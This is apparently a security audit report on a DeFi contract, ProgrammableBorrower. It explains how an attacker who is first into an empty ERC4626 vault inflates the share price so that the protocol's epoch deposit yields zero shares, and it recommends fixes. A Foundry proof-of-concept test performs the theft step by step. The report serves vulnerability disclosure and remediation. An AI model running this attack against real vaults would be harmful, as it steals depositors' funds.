### Title
Uninitialized ERC4626 vault can steal programmable-borrower deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` deposits idle epoch capital into a configured ERC4626 vault without enforcing a minimum number of shares. If an attacker is the first depositor into that vault and inflates its share price with a direct donation, `vault.deposit()` can return zero shares while still taking the full underlying amount. The resulting vault loss is treated as borrower/default risk even though the assets were effectively captured by the attacker.

### Finding Description

During `startEpoch`, `IdleCDOEpochVariant` transfers surplus pool assets to the configured borrower and then calls `onStartEpoch` when the borrower is programmable. [1](#0-0) 

`ProgrammableBorrower.onStartEpoch` records the entire on-hand token balance in `startAssets`, immediately deposits that balance into the external ERC4626 vault, and then stores the pre-deposit amount as `epochStartVaultAssets`. [2](#0-1) 

The actual deposit is performed by `_depositToVault`, which accepts the returned `shares` value without checking it against `previewDeposit`, `convertToShares`, or a nonzero/minimum threshold. [3](#0-2) 

The vault is only required to have the same underlying asset; there is no requirement that it already has a safe supply/asset ratio, a nonzero share supply, or protection against first-depositor share inflation. [4](#0-3) 

Consequently, an unprivileged attacker can permissionlessly deposit `1` wei of shares into a newly configured vault, donate slightly more than the expected pool deposit, and cause the programmable borrower's deposit calculation to round down to zero shares. The attacker remains the only vault shareholder and can redeem both the donation and the pool deposit.

### Impact Explanation

The protocol loses the full amount deposited into the manipulated vault. For example, if the epoch sends 10,000 USDC to the programmable borrower, an attacker can donate 10,000 USDC plus one wei after minting one vault share. A naive proportional `assets * totalSupply / totalAssets` conversion then returns zero shares for the borrower's 10,000-USDC deposit.

`epochStartVaultAssets` still records 10,000 USDC, while `_currentVaultAssets()` is zero, so `_vaultNetInterest()` reports a 10,000-USDC vault loss. [5](#0-4) 

At `stopEpoch`, the missing vault backing can make the borrower transfer fail and route the pool into default handling, while the attacker has already redeemed the vault balance. The broken invariant is fair external-accounting conversion: assets sent to the vault are assumed to remain represented by vault shares, but no such guarantee is enforced. [6](#0-5) 

### Likelihood Explanation

This requires the configured ERC4626 vault to be empty or have a share price that can be inflated enough to round the programmable borrower's deposit down to an unacceptable amount. ERC4626 deposits and direct underlying transfers are generally permissionless, so an attacker can prepare the vault before the manager starts the epoch.

The attack is not prevented by KYC because the attacker interacts only with the external vault, not with `IdleCDOEpochVariant`. It is also not prevented by `_skimDonatedAssets`, because the donation is sent to the external ERC4626 vault rather than directly to the CDO or programmable borrower. [7](#0-6) 

Likelihood is constrained by vault selection: an established vault with deep share supply cannot normally be driven to zero-share deposits economically. The issue is most relevant when a new or empty ERC4626 vault is configured for the programmable borrower.

### Recommendation

- Before accepting a vault in `initialize` or `setVault`, require a healthy minimum share supply or require the vault to use a share-inflation-resistant implementation.
- In `_depositToVault`, require `shares >= minShares`, where `minShares` is derived from `previewDeposit(_assetAmount)` or `convertToShares(_assetAmount)` with an explicit slippage tolerance.
- At minimum, revert when `_assetAmount != 0 && shares == 0`.
- Prefer a conservative tolerance such as `shares >= previewDeposit(_assetAmount) * 95 / 100` rather than an unconditional nonzero check.
- If vault deployment is part of product setup, atomically seed the vault before configuring it in `ProgrammableBorrower`, or use an implementation with virtual shares/assets.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC4626} from "../../contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableERC20 is ERC20 {
  constructor() ERC20("USDC", "USDC") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

// Deliberately minimal ERC4626 accounting: shares = assets * supply / assetsBefore.
contract InflatableVault is ERC20 {
  InflatableERC20 public immutable underlying;

  constructor(InflatableERC20 asset_) ERC20("Vault Share", "vSHARE") {
    underlying = asset_;
  }

  function asset() external view returns (address) {
    return address(underlying);
  }

  function totalAssets() public view returns (uint256) {
    return underlying.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 assetsBefore = totalAssets();
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0
      ? assets
      : assets * supply / assetsBefore;

    underlying.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    underlying.transfer(receiver, assets);
  }

  // Remaining IERC4626 functions omitted for brevity.
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  InflatableERC20 internal token;
  InflatableVault internal vault;
  ProgrammableBorrower internal borrowerAdapter;

  address internal idleCDO = makeAddr("idleCDO");
  address internal owner = makeAddr("owner");
  address internal manager = makeAddr("manager");
  address internal realBorrower = makeAddr("realBorrower");
  address internal attacker = makeAddr("attacker");

  function test_firstDepositorInflationStealsEpochDeposit() external {
    token = new InflatableERC20();
    vault = new InflatableVault(token);

    // Deploy/initialize ProgrammableBorrower with `vault`.
    // `initialize` validates only `vault.asset() == underlyingToken`.

    uint256 epochDeposit = 10_000e6;

    // Attacker becomes the first vault depositor.
    token.mint(attacker, epochDeposit + 2);
    vm.startPrank(attacker);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);

    // Inflate the vault so 10,000e6 * 1 / (10,000e6 + 1) == 0.
    token.transfer(address(vault), epochDeposit + 1);
    vm.stopPrank();

    // IdleCDO sends epoch capital to the programmable borrower.
    token.mint(idleCDO, epochDeposit);
    vm.prank(idleCDO);
    token.transfer(address(borrowerAdapter), epochDeposit);

    // Manager calls cdoEpoch.startEpoch(), which calls this hook.
    vm.prank(idleCDO);
    borrowerAdapter.onStartEpoch(0);

    // The adapter paid 10,000 USDC but received zero vault shares.
    assertEq(vault.balanceOf(address(borrowerAdapter)), 0);
    assertEq(token.balanceOf(address(vault)), epochDeposit + epochDeposit + 2);

    // The attacker's one share represents the entire vault balance.
    uint256 attackerBefore = token.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(
      token.balanceOf(attacker) - attackerBefore,
      epochDeposit + epochDeposit + 2
    );
  }
}
